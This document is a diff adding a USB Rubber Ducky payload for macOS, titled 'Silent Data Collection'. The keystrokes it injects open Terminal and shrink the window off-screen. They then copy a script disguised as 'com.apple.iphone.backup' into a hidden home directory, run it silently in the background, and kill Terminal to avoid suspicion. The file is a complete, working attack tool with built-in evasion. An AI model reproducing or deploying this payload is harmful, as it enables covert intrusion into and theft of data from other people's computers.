@@ -1,0 +1,54 @@
+REM ================================================
+REM Rubber Ducky Payload: macOS Silent Data Collection
+REM Author: [Your Name/Handle]
+REM Description: This payload targets macOS systems.
+REM It opens Terminal, copies a hidden bash script (`com.apple.iphone.backup`)
+REM to a hidden directory within the user’s home directory,
+REM runs the script silently, and closes Terminal to avoid suspicion.
+REM ================================================
+
+REM === Set Rubber Ducky to HID and STORAGE mode ===
+ATTACKMODE HID STORAGE
+
+REM === Set a delay to ensure macOS recognizes the USB drive ===
+DELAY 1000
+
+REM === Check if the target OS is macOS before proceeding ===
+IF OS "MAC"
+
+  REM === Open Spotlight and launch Terminal ===
+  GUI SPACE
+  DELAY 500
+  STRING terminal
+  ENTER
+  DELAY 1000
+
+  REM === Resize the Terminal window to 1x1 and move it off-screen ===
+  STRING printf '\e[8;1;1t'; printf '\e[3;2560;1440t'
+  ENTER
+  DELAY 500
+
+  REM === Mount the Rubber Ducky USB drive ===
+  STRING drive=$(ls /Volumes | while read d; do [ -x "/Volumes/$d" ] && [ -f "/Volumes/$d/com.apple.iphone.backup" ] && echo $d && break; done); cd "/Volumes/$drive"
+  ENTER
+  DELAY 500
+
+  REM === Copy the `com.apple.iphone.backup` script to a hidden directory ===
+  STRING mkdir -p "$HOME/.sys"; cp ./com.apple.iphone.backup "$HOME/.sys/com.apple.iphone.backup"; chmod +x "$HOME/.sys/com.apple.iphone.backup"
+  ENTER
+  DELAY 500
+
+  REM === Execute the script silently in the background ===
+  STRING nohup "$HOME/.sys/com.apple.iphone.backup" >/dev/null 2>&1 &
+  ENTER
+  DELAY 500
+
+  REM === Close Terminal to avoid suspicion ===
+  STRING killall Terminal
+  ENTER
+
+ELSE
+  REM === If not macOS, exit silently ===
+  DEFAULTDELAY 500
+ENDIF
+
